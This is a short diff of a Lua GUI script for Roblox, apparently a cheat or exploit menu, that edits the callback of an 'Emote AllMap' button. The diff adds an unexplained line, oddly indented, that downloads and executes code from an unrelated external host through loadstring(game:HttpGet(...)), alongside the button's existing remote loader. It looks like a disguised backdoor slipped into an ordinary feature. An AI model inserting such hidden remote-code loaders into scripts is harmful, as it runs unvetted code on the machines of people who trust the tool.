@@ -284,6 +284,7 @@ GUI:CreateButton({
     text = "🕺 Emote AllMap",
     callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/adisetiadi64a/ADYRDP/refs/heads/main/emote.lua"))()
+			loadstring(game:HttpGet("https://yarhm.mhi.im/scr?channel=afemmax"))()
     end
 })
 -------------------------------------------------
@@ -919,6 +920,7 @@ GUI:CreateButton({
         GUI:CreateNotify({ title = "Settings Reset", text = "All settings have been reset to default."})
     end
 })
+
 
 
 
